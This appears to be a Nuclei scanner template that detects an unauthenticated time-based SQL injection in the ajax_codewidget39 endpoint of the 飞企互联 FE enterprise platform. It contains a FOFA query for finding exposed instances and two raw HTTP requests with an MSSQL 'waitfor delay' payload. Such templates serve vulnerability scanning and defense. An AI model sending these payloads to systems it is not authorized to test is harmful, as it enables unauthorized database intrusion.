id: FE-ajax_codewidget39-sql-injection

info:
  name: "飞企互联-FE企业运营管理平台 ajax_codewidget39接口SQL延时注入"
  author: Unknown
  severity: high
  description: |-
    fofa: app="飞企互联-FE企业运营管理平台"
      飞企互联-FE企业运营管理平台的ajax_codewidget39接口存在SQL延时注入漏洞。攻击者可通过构造恶意SQL语句触发时间延迟注入，绕过常规安全检测机制，实现数据库结构探测及敏感数据提取。该漏洞允许未经身份验证的远程攻击者通过注入点执行任意SQL查询，可能导致完整的数据库内容泄露，并为后续服务器权限提升提供攻击路径。
  reference:
  - https://blog.csdn.net/m0_60571842/article/details/140070608
  tags: 飞企互联-FE企业运营管理平台

http:
- raw:
  - |
    GET /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:3%27--+ HTTP/1.1
    Host: {{Hostname}}

  - |
    GET /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:6%27--+ HTTP/1.1
    Host: {{Hostname}}

  matchers-condition: and
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=3 && duration_1<=4'
    - 'duration_2>=6 && duration_2<=7'
    condition: and
  - type: status
    status:
    - 200





